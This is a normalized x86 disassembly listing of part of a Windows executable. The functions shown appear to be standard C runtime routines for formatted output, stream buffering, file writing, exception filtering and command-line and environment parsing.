sub eax 0x2b
je r-xdata
or ch 0x80
jmp r-xdata
xor edx edx
jmp r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
sub eax 0xb
je r-xdata
or ecx eax
jmp r-xdata
test cl 0x2
jne r-xdata
sub eax 0x19
je r-xdata
mov al [ edi + 0x1 ]
inc edi
cmp al bl
je r-xdata
mov [ ebp - 0x8 ] 0x1
or esi 0x4000
jmp r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
sub eax 0x6
jne r-xdata
and ecx 0xfffffffe
and esi 0xfffffffc
or ecx 0x2
or esi 0x80
jmp r-xdata
test cl 0x40
jne r-xdata
sub eax 0xe
je r-xdata
mov [ ebp - 0x8 ] 0x1
and esi 0xffffbfff
jmp r-xdata
test ch 0xc0
jne r-xdata
or ecx 0x40
jmp r-xdata
cmp [ ebp - 0x4 ] ebx
jne r-xdata
dec eax
jne r-xdata
or ch 0x40
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
or ecx 0x10
jmp r-xdata
cmp [ ebp - 0x4 ] ebx
jne r-xdata
mov [ ebp - 0x4 ] 0x1
or ecx 0x20
jmp r-xdata
sub_40866e
mov edx [ rw-data ]
push ebx
push ebp
push esi
xor ebp ebp
xor esi esi
xor eax eax
cmp edx ebp
push edi
jle r-xdata
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
retn
mov ebx [ rw-data ]
mov edi ebx
mov edi eax
push 0x20
shl edi 0x2
call sub_4044f2
pop ecx
mov ecx [ rw-data ]
mov [ edi + ecx ] eax
mov eax [ rw-data ]
mov edi [ edi + eax ]
cmp edi ebp
je r-xdata
test [ ecx + 0xc ] 0x83
je r-xdata
mov esi edi
mov esi [ ebx + eax * 4 ]
jmp r-xdata
inc eax
add edi 0x4
cmp eax edx
jl r-xdata
or [ esi + 0x10 ] 0xffffffff
mov [ esi + 0x4 ] ebp
mov [ esi + 0xc ] ebp
mov [ esi + 0x8 ] ebp
mov [ esi ] ebp
mov [ esi + 0x1c ] ebp
cmp esi ebp
je r-xdata
mov ecx [ edi ]
cmp ecx ebp
je r-xdata
jmp r-xdata
sub_4086e6
push ebp
mov ebp esp
sub esp 0x24c
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ecx ecx
push edi
mov [ ebp - 0x10 ] ecx
mov bl [ esi ]
inc esi
test bl bl
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp + 0xc ] esi
je r-xdata
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
leave
retn
mov edi 0x800
mov edx 0x200
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jl r-xdata
cmp bl 0x20
jl r-xdata
xor eax eax
cmp bl 0x78
jg r-xdata
mov esi [ ebp + 0xc ]
mov bl [ esi ]
inc esi
test bl bl
mov [ ebp + 0xc ] esi
jne r-xdata
jmp [ eax * 4 + jump_table_408e64 ]
movsx eax bl
mov al [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov ecx [ ebp - 0x3c ]
mov edx 0x200
mov edi 0x800
xor eax eax
or [ ebp - 0x8 ] 0xffffffff
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x2c ] eax
jmp r-xdata
movsx eax bl
sub eax 0x20
je r-xdata
cmp bl 0x2a
jne r-xdata
and [ ebp - 0x8 ] 0x0
jmp r-xdata
cmp bl 0x2a
jne r-xdata
cmp bl 0x49
je r-xdata
mov ecx [ rw-data ]
and [ ebp - 0x2c ] 0x0
movzx eax bl
test [ ecx + eax * 2 + 0x1 ] 0x80
je r-xdata
movsx eax bl
cmp eax 0x67
jg r-xdata
movsx eax [ ecx + eax * 8 + r--data ]
sar eax 0x4
cmp eax 0x7
mov [ ebp - 0x3c ] eax
ja r-xdata
or [ ebp - 0x4 ] 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x28 ]
movsx ecx bl
lea eax [ eax + eax * 4 ]
lea eax [ ecx + eax * 2 - 0x30 ]
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_406579
test eax eax
pop ecx
mov [ ebp - 0x28 ] eax
jge r-xdata
mov eax [ ebp - 0x8 ]
movsx ecx bl
lea eax [ eax + eax * 4 ]
lea eax [ ecx + eax * 2 - 0x30 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_406579
test eax eax
pop ecx
mov [ ebp - 0x8 ] eax
jge r-xdata
cmp [ esi ] 0x36
jne r-xdata
cmp bl 0x68
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
movsx eax bl
push eax
call sub_408e84
add esp 0xc
jmp r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
movsx eax bl
push eax
call sub_408e84
mov bl [ esi ]
add esp 0xc
inc esi
mov [ ebp + 0xc ] esi
sub eax 0x69
je r-xdata
cmp eax 0x65
jge r-xdata
or [ ebp - 0x4 ] 0x80
jmp r-xdata
sub eax 0x8
je r-xdata
mov [ ebp - 0x28 ] eax
jmp r-xdata
or [ ebp - 0x4 ] 0x4
neg eax
or [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
and [ ebp - 0x3c ] 0x0
cmp [ esi + 0x1 ] 0x34
jne r-xdata
or [ ebp - 0x4 ] 0x20
jmp r-xdata
cmp bl 0x6c
je r-xdata
or [ ebp - 0x4 ] 0x40
sub eax 0x5
je r-xdata
or [ ebp - 0x4 ] 0x40
cmp [ ebp - 0x8 ] 0x0
lea edi [ ebp - 0x24c ]
mov [ ebp - 0xc ] edi
jge r-xdata
cmp eax 0x58
jg r-xdata
or [ ebp - 0x4 ] 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
inc esi
inc esi
or [ ebp - 0x3 ] 0x80
mov [ ebp + 0xc ] esi
jmp r-xdata
or [ ebp - 0x4 ] 0x10
jmp r-xdata
cmp bl 0x77
jne r-xdata
test [ ebp - 0x4 ] 0x20
je r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_408f22
pop ecx
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_406579
test [ ebp - 0x4 ] 0x20
pop ecx
je r-xdata
dec eax
je r-xdata
jne r-xdata
mov [ ebp - 0x8 ] 0x6
jmp r-xdata
sub eax 0x5a
je r-xdata
je r-xdata
or [ ebp - 0x4 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
or [ ebp - 0x4 ] edi
jmp r-xdata
test [ ebp - 0x4 ] 0x40
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
test [ ebp - 0x4 ] 0x40
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
test [ ebp - 0x4 ] 0x40
je r-xdata
mov ecx [ ebp - 0x14 ]
mov [ eax ] ecx
mov cx [ ebp - 0x14 ]
mov [ eax ] cx
jmp r-xdata
test [ ebp - 0x4 ] 0x80
mov [ ebp - 0x10 ] 0x8
je r-xdata
dec eax
je r-xdata
cmp [ ebp - 0x8 ] edx
jle r-xdata
cmp bl 0x67
jne r-xdata
mov eax [ ebp + 0x10 ]
push [ ebp - 0x40 ]
add eax 0x8
mov [ ebp + 0x10 ] eax
push [ ebp - 0x8 ]
mov ecx [ eax - 0x8 ]
mov [ ebp - 0x4c ] ecx
mov eax [ eax - 0x4 ]
mov [ ebp - 0x48 ] eax
movsx eax bl
push eax
lea eax [ ebp - 0x4c ]
push edi
push eax
call [ rw-data ]
mov esi [ ebp - 0x4 ]
add esp 0x14
and esi 0x80
je r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_406579
test eax eax
pop ecx
je r-xdata
sub eax 0x9
je r-xdata
mov [ ebp - 0x34 ] 0x7
sub eax 0x43
je r-xdata
or [ ebp - 0x4 ] 0x8
jmp r-xdata
call sub_406579
pop ecx
xor edx edx
call sub_406579
pop ecx
jmp r-xdata
call sub_406579
pop ecx
movzx eax ax
jmp r-xdata
call sub_406579
pop ecx
movsx eax ax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
test edx edx
jg r-xdata
cmp [ ebp - 0x30 ] 0x0
je r-xdata
mov [ ebp - 0x38 ] 0x1
jmp r-xdata
test [ ebp - 0x3 ] 0x80
je r-xdata
or [ ebp - 0x4 ] edx
jmp r-xdata
mov [ ebp - 0x8 ] 0x8
sub eax 0x3
je r-xdata
cmp [ ebp - 0x8 ] 0xa3
jle r-xdata
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
cmp bl 0x67
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
push eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
test [ ebp - 0x4 ] 0x810
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
dec eax
je r-xdata
mov al [ ebp - 0x34 ]
mov [ ebp - 0x16 ] 0x30
add al 0x51
mov [ ebp - 0x24 ] 0x2
mov [ ebp - 0x15 ] al
jmp r-xdata
test [ ebp - 0x4 ] 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cdq
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
and [ ebp - 0x1c ] 0x0
jl r-xdata
push [ ebp - 0x30 ]
call sub_405bdc
and [ ebp - 0x30 ] 0x0
pop ecx
cmp [ ebp - 0x8 ] 0xffffffff
mov esi 0x7fffffff
je r-xdata
dec eax
dec eax
je r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x15d
push eax
call sub_4044f2
test eax eax
pop ecx
mov [ ebp - 0x30 ] eax
je r-xdata
cmp [ edi ] 0x2d
jne r-xdata
test esi esi
jne r-xdata
push edi
call [ rw-data ]
pop ecx
call sub_40ab20
pop ecx
jmp r-xdata
test [ ebp - 0x4 ] edi
je r-xdata
call sub_406579
pop ecx
mov [ ebp - 0x24c ] al
mov [ ebp - 0x10 ] 0x1
call sub_408f32
push eax
lea eax [ ebp - 0x24c ]
push eax
call sub_40b939
add esp 0xc
mov [ ebp - 0x10 ] eax
test eax eax
jge r-xdata
jmp r-xdata
or [ ebp - 0x4 ] edi
mov [ ebp - 0x40 ] 0x1
add bl 0x20
dec eax
dec eax
je r-xdata
and [ ebp - 0x4 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0x8 ] eax
jle r-xdata
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
mov [ ebp - 0x20 ] eax
neg edx
or [ ebp - 0x3 ] 0x1
mov [ ebp - 0x1c ] edx
jmp r-xdata
test eax eax
jae r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_406579
test [ ebp - 0x4 ] 0x810
pop ecx
mov ecx eax
mov [ ebp - 0xc ] ecx
je r-xdata
mov esi [ ebp - 0x8 ]
mov [ ebp - 0x10 ] 0xa
sub eax 0x3
jne r-xdata
mov [ ebp - 0x8 ] 0xa3
mov edi eax
mov [ ebp - 0xc ] edi
jmp r-xdata
push edi
or [ ebp - 0x3 ] 0x1
inc edi
mov [ ebp - 0xc ] edi
push edi
call [ rw-data ]
pop ecx
mov [ ebp - 0x10 ] eax
and [ ebp - 0x2c ] 0x0
mov [ ebp - 0xc ] ecx
movsx eax [ eax ]
jmp r-xdata
movsx eax [ eax ]
shr eax 0x1
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x2c ] 0x1
jmp r-xdata
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
lea eax [ ebp - 0x24c ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ ebp - 0x38 ] 0x1
jmp r-xdata
sub eax 0xc
jne r-xdata
mov eax [ ebp - 0x20 ]
or eax [ ebp - 0x1c ]
jne r-xdata
mov [ ebp - 0x8 ] eax
test [ ebp - 0x3 ] 0x80
jne r-xdata
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
mov [ ebp - 0x34 ] 0x27
jmp r-xdata
mov ebx [ ebp - 0x4 ]
test bl 0x40
je r-xdata
test [ ebp - 0x4 ] 0x830
jne r-xdata
lea eax [ ebp - 0x4d ]
mov [ ebp - 0xc ] eax
and [ ebp - 0x24 ] 0x0
mov eax ecx
mov ecx [ rw-data ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x2c ] 0x1
mov eax ecx
mov ecx [ rw-data ]
mov [ ebp - 0xc ] ecx
test [ ebp - 0x4 ] 0x80
mov [ ebp - 0x10 ] 0x10
je r-xdata
mov esi [ ebp - 0x28 ]
sub esi [ ebp - 0x24 ]
sub esi [ ebp - 0x10 ]
test bl 0xc
jne r-xdata
test bh 0x1
je r-xdata
or [ ebp - 0x4 ] edi
mov eax [ ebp - 0x10 ]
cdq
mov edi edx
mov esi eax
push edi
push esi
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call sub_40ade0
push edi
push esi
push [ ebp - 0x1c ]
mov ebx eax
add ebx 0x30
push [ ebp - 0x20 ]
call sub_40ad70
cmp ebx 0x39
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
jle r-xdata
mov eax [ ebp - 0x20 ]
or eax [ ebp - 0x1c ]
je r-xdata
sub eax ecx
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
sub eax ecx
sar eax 0x1
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x16 ]
push [ ebp + 0x8 ]
push [ ebp - 0x24 ]
push eax
call sub_408eea
add esp 0x10
test bl 0x8
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x20
call sub_408eb9
add esp 0x10
test bl 0x1
je r-xdata
mov [ ebp - 0x16 ] 0x2d
jmp r-xdata
mov eax [ ebp - 0xc ]
dec [ ebp - 0xc ]
mov [ eax ] bl
jmp r-xdata
add ebx [ ebp - 0x34 ]
lea eax [ ebp - 0x4d ]
sub eax [ ebp - 0xc ]
inc [ ebp - 0xc ]
test [ ebp - 0x3 ] 0x2
mov [ ebp - 0x10 ] eax
je r-xdata
inc eax
jmp r-xdata
inc eax
inc eax
jmp r-xdata
cmp [ ebp - 0x2c ] 0x0
je r-xdata
test bl 0x4
jne r-xdata
test bl 0x2
je r-xdata
mov [ ebp - 0x16 ] 0x2b
jmp r-xdata
mov [ ebp - 0x24 ] 0x1
mov eax [ ebp - 0x8 ]
dec [ ebp - 0x8 ]
test eax eax
jg r-xdata
mov ecx [ ebp - 0xc ]
cmp [ ecx ] 0x30
jne r-xdata
mov edx esi
dec esi
test edx edx
je r-xdata
mov edx esi
dec esi
test edx edx
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
call sub_408eea
add esp 0x10
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x30
call sub_408eb9
add esp 0x10
mov [ ebp - 0x16 ] 0x20
dec [ ebp - 0xc ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx ] 0x30
test eax eax
jne r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x20
call sub_408eb9
add esp 0x10
mov eax [ ebp - 0x10 ]
mov ebx [ ebp - 0xc ]
lea edi [ eax - 0x1 ]
test [ ebp - 0x4 ] 0x4
je r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
push [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x44 ]
push eax
call sub_408eea
add esp 0x10
mov eax edi
dec edi
test eax eax
jne r-xdata
mov ax [ ebx ]
inc ebx
push eax
lea eax [ ebp - 0x44 ]
push eax
inc ebx
call sub_40b939
pop ecx
test eax eax
pop ecx
jle r-xdata
jmp r-xdata
sub_408e84
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
dec [ ecx + 0x4 ]
js r-xdata
push ecx
push [ ebp + 0x8 ]
call sub_405c45
pop ecx
pop ecx
mov edx [ ecx ]
mov al [ ebp + 0x8 ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ eax ]
pop ebp
retn
or [ eax ] 0xffffffff
pop ebp
retn
cmp eax 0xffffffff
mov eax [ ebp + 0x10 ]
jne r-xdata
sub_408eb9
push esi
push edi
mov edi [ esp + 0x10 ]
mov eax edi
dec edi
test eax eax
jle r-xdata
pop edi
pop esi
retn
mov esi [ esp + 0x18 ]
mov eax edi
dec edi
test eax eax
jg r-xdata
push esi
push [ esp + 0x18 ]
push [ esp + 0x14 ]
call sub_408e84
add esp 0xc
cmp [ esi ] 0xffffffff
je r-xdata
sub_408eea
push ebx
mov ebx [ esp + 0xc ]
mov eax ebx
dec ebx
push esi
push edi
test eax eax
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esp + 0x1c ]
mov esi [ esp + 0x10 ]
mov eax ebx
dec ebx
test eax eax
jg r-xdata
movsx eax [ esi ]
push edi
inc esi
push [ esp + 0x1c ]
push eax
call sub_408e84
add esp 0xc
cmp [ edi ] 0xffffffff
je r-xdata
sub_408f40
push ebp
mov ebp esp
sub esp 0x24
push ebx
mov ebx [ ebp + 0x8 ]
sub ebx 0x76c
cmp ebx 0x46
jl r-xdata
or eax 0xffffffff
cmp ebx 0x8a
jg r-xdata
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ edi * 4 + rw-data ]
add esi [ ebp + 0x10 ]
test bl 0x3
jne r-xdata
call sub_40b9a1
mov eax ebx
lea ecx [ ebx - 0x1 ]
imul eax eax 0x16d
sar ecx 0x2
mov edx esi
mov [ ebp - 0x8 ] esi
add edx ecx
mov [ ebp - 0x10 ] ebx
add eax edx
mov edx [ ebp + 0x1c ]
lea ecx [ eax + eax * 2 ]
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x1c ] eax
lea ecx [ eax + ecx * 8 ]
imul ecx ecx 0x3c
add ecx [ ebp + 0x18 ]
imul ecx ecx 0x3c
add ecx [ rw-data ]
dec edi
cmp [ ebp + 0x20 ] 0x1
mov [ ebp - 0x14 ] edi
pop edi
pop esi
lea ecx [ ecx + edx + 0x7c558180 ]
mov [ ebp + 0x8 ] ecx
je r-xdata
cmp edi 0x2
jle r-xdata
add ecx [ rw-data ]
cmp [ ebp + 0x20 ] 0xffffffff
jne r-xdata
inc esi
pop ebx
leave
retn
mov eax ecx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_40bc14
pop ecx
mov ecx [ ebp + 0x8 ]
test eax eax
je r-xdata
sub_409002
push esi
mov esi [ esp + 0x8 ]
push [ esi + 0x10 ]
call sub_40ac82
test eax eax
pop ecx
je r-xdata
xor eax eax
pop esi
retn
cmp esi rw-data
jne r-xdata
cmp esi rw-data
jne r-xdata
xor eax eax
jmp r-xdata
push 0x1
pop eax
inc [ rw-data ]
test [ esi + 0xc ] 0x10c
jne r-xdata
cmp [ eax * 4 + rw-data ] 0x0
push ebx
push edi
lea edi [ eax * 4 + rw-data ]
mov ebx 0x1000
jne r-xdata
mov edi [ edi ]
mov [ esi + 0x18 ] ebx
mov [ esi + 0x8 ] edi
mov [ esi ] edi
mov [ esi + 0x4 ] ebx
push ebx
call sub_4044f2
test eax eax
pop ecx
mov [ edi ] eax
jne r-xdata
lea eax [ esi + 0x14 ]
push 0x2
mov [ esi + 0x8 ] eax
mov [ esi ] eax
pop eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x4 ] eax
jmp r-xdata
or [ esi + 0xc ] 0x1102
push 0x1
pop eax
pop edi
pop ebx
pop esi
retn
sub_40908f
cmp [ esp + 0x4 ] 0x0
push esi
je r-xdata
mov eax [ esp + 0xc ]
test [ eax + 0xd ] 0x10
je r-xdata
mov esi [ esp + 0xc ]
test [ esi + 0xd ] 0x10
je r-xdata
pop esi
retn
push eax
call sub_40815d
pop ecx
push esi
call sub_40815d
and [ esi + 0xd ] 0xee
and [ esi + 0x18 ] 0x0
and [ esi ] 0x0
and [ esi + 0x8 ] 0x0
pop ecx
pop esi
retn
sub_4090cc
mov eax [ rw-data ]
push esi
push 0x14
test eax eax
pop esi
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_40bf00
pop ecx
mov [ rw-data ] eax
test eax eax
pop ecx
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor ecx ecx
mov eax rw-data
push 0x4
push esi
mov [ rw-data ] esi
call sub_40bf00
pop ecx
mov [ rw-data ] eax
test eax eax
pop ecx
jne r-xdata
mov edx [ rw-data ]
mov [ ecx + edx ] eax
add eax 0x20
add ecx 0x4
cmp eax rw-data
jl r-xdata
xor edx edx
mov ecx rw-data
push 0x1a
call sub_404de5
pop ecx
or [ ecx ] 0xffffffff
test eax eax
jne r-xdata
mov eax edx
mov esi edx
sar eax 0x5
and esi 0x1f
mov eax [ eax * 4 + rw-data ]
mov eax [ eax + esi * 8 ]
cmp eax 0xffffffff
je r-xdata
pop esi
retn
add ecx 0x20
inc edx
cmp ecx rw-data
jl r-xdata
sub_409185
push ebp
mov ebp esp
sub esp 0x414
mov ecx [ ebp + 0x8 ]
push ebx
cmp ecx [ rw-data ]
push esi
push edi
jae r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x9
mov eax ecx
mov esi ecx
sar eax 0x5
and esi 0x1f
lea ebx [ eax * 4 + rw-data ]
shl esi 0x3
mov eax [ ebx ]
mov al [ eax + esi + 0x4 ]
test al 0x1
je r-xdata
xor edi edi
cmp [ ebp + 0x10 ] edi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x10 ] edi
jne r-xdata
test al 0x20
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx ]
add eax esi
test [ eax + 0x4 ] 0x80
je r-xdata
push 0x2
push edi
push ecx
call sub_40aba4
add esp 0xc
pop edi
pop esi
pop ebx
leave
retn
lea ecx [ ebp - 0xc ]
push edi
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ ebp + 0x10 ] edi
mov [ ebp - 0x4 ] eax
mov [ ebp + 0x8 ] edi
jbe r-xdata
call [ GetLastError@IAT ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp + 0x8 ] edi
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x40
je r-xdata
lea eax [ ebp - 0x414 ]
mov eax [ ebp - 0x8 ]
cmp eax edi
jne r-xdata
mov [ rw-data ] 0x1c
mov [ rw-data ] edi
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x1a
je r-xdata
mov edi eax
lea eax [ ebp - 0x414 ]
sub edi eax
lea eax [ ebp - 0xc ]
push 0x0
push eax
lea eax [ ebp - 0x414 ]
push edi
push eax
mov eax [ ebx ]
push [ eax + esi ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov cl [ ecx ]
cmp cl 0xa
jne r-xdata
sub eax [ ebp - 0x10 ]
jmp r-xdata
cmp [ ebp + 0x8 ] edi
je r-xdata
or eax 0xffffffff
call [ GetLastError@IAT ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
cmp eax edi
jl r-xdata
mov [ eax ] cl
inc eax
mov ecx eax
lea edx [ ebp - 0x414 ]
sub ecx edx
cmp ecx 0x400
jl r-xdata
inc [ ebp - 0x10 ]
mov [ eax ] 0xd
inc eax
push 0x5
pop eax
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor edi edi
mov eax [ ebp - 0x4 ]
sub eax [ ebp + 0xc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx [ ebp + 0xc ]
cmp ecx [ ebp + 0x10 ]
jae r-xdata
push [ ebp + 0x8 ]
call sub_40b3ff
pop ecx
jmp r-xdata
mov [ rw-data ] 0x9
mov [ rw-data ] eax
jmp r-xdata
sub_409332
push ebp
mov ebp esp
push ebx
push [ ebp + 0x8 ]
call sub_409473
test eax eax
pop ecx
je r-xdata
push [ ebp + 0xc ]
call [ UnhandledExceptionFilter@IAT ]
mov ebx [ eax + 0x8 ]
test ebx ebx
je r-xdata
cmp ebx 0x5
jne r-xdata
cmp ebx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
push 0x1
pop eax
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx [ rw-data ]
mov [ ebp + 0x8 ] ecx
mov ecx [ ebp + 0xc ]
mov [ rw-data ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
pop ebx
pop ebp
retn
and [ eax + 0x8 ] 0x0
push ecx
call ebx
pop ecx
mov ecx [ rw-data ]
mov edx [ rw-data ]
add edx ecx
push esi
cmp ecx edx
jge r-xdata
mov eax [ eax ]
mov esi [ rw-data ]
cmp eax 0xc000008e
jne r-xdata
lea esi [ ecx + ecx * 2 ]
sub edx ecx
lea esi [ esi * 4 + rw-data ]
cmp eax 0xc0000090
jne r-xdata
mov [ rw-data ] 0x83
jmp r-xdata
and [ esi ] 0x0
add esi 0xc
dec edx
jne r-xdata
cmp eax 0xc0000091
jne r-xdata
mov [ rw-data ] 0x81
jmp r-xdata
push [ rw-data ]
push 0x8
call ebx
pop ecx
mov [ rw-data ] esi
pop ecx
pop esi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ rw-data ] 0x84
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
cmp eax 0xc000008d
jne r-xdata
mov [ rw-data ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ rw-data ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ rw-data ] 0x86
jmp r-xdata
mov [ rw-data ] 0x8a
sub_409473
mov edx [ esp + 0x4 ]
mov ecx [ rw-data ]
cmp [ rw-data ] edx
push esi
mov eax rw-data
je r-xdata
lea ecx [ ecx + ecx * 2 ]
pop esi
lea ecx [ ecx * 4 + rw-data ]
cmp eax ecx
jae r-xdata
lea esi [ ecx + ecx * 2 ]
lea esi [ esi * 4 + rw-data ]
xor eax eax
cmp [ eax ] edx
je r-xdata
cmp [ eax ] edx
jne r-xdata
retn
add eax 0xc
cmp eax esi
jae r-xdata
sub_4094b6
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
mov al [ esi ]
cmp al 0x22
jne r-xdata
call sub_40c40f
cmp al 0x20
jbe r-xdata
mov al [ esi + 0x1 ]
inc esi
cmp al 0x22
je r-xdata
mov al [ esi ]
test al al
je r-xdata
inc esi
cmp [ esi ] 0x20
ja r-xdata
cmp [ esi ] 0x22
jne r-xdata
test al al
je r-xdata
mov eax esi
pop esi
retn
cmp al 0x20
jbe r-xdata
inc esi
jmp r-xdata
movzx eax al
push eax
call sub_40c009
test eax eax
pop ecx
je r-xdata
inc esi
jmp r-xdata
sub_40950e
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov esi [ rw-data ]
xor edi edi
call sub_40c40f
lea eax [ edi * 4 + 0x4 ]
push eax
call sub_4044f2
mov esi eax
pop ecx
cmp esi ebx
mov [ rw-data ] esi
jne r-xdata
cmp al 0x3d
je r-xdata
mov edi [ rw-data ]
cmp [ edi ] bl
je r-xdata
push 0x9
call sub_404de5
pop ecx
push esi
call sub_40ab20
pop ecx
lea esi [ esi + eax + 0x1 ]
jmp r-xdata
inc edi
push [ rw-data ]
call sub_405bdc
pop ecx
mov [ rw-data ] ebx
mov [ esi ] ebx
pop edi
pop esi
mov [ rw-data ] 0x1
pop ebx
retn
push ebp
mov al [ esi ]
cmp al bl
je r-xdata
add edi ebp
cmp [ edi ] bl
jne r-xdata
push ebp
call sub_4044f2
cmp eax ebx
pop ecx
mov [ esi ] eax
jne r-xdata
push edi
call sub_40ab20
mov ebp eax
pop ecx
inc ebp
cmp [ edi ] 0x3d
je r-xdata
pop ebp
push edi
push [ esi ]
call sub_40a890
pop ecx
add esi 0x4
pop ecx
push 0x9
call sub_404de5
pop ecx
sub_4095c7
push ebp
mov ebp esp
push ecx
push ecx
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov esi rw-data
push 0x104
push esi
push ebx
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
mov edi esi
cmp [ eax ] bl
je r-xdata
call sub_40c40f
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push ebx
push ebx
push edi
call sub_409660
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
lea eax [ eax + ecx * 4 ]
push eax
call sub_4044f2
mov esi eax
add esp 0x18
cmp esi ebx
jne r-xdata
mov edi eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
lea eax [ esi + eax * 4 ]
push eax
push esi
push edi
call sub_409660
mov eax [ ebp - 0x4 ]
add esp 0x14
dec eax
mov [ rw-data ] esi
pop edi
pop esi
mov [ rw-data ] eax
pop ebx
leave
retn
push 0x8
call sub_404de5
pop ecx
sub_409660
push ebp
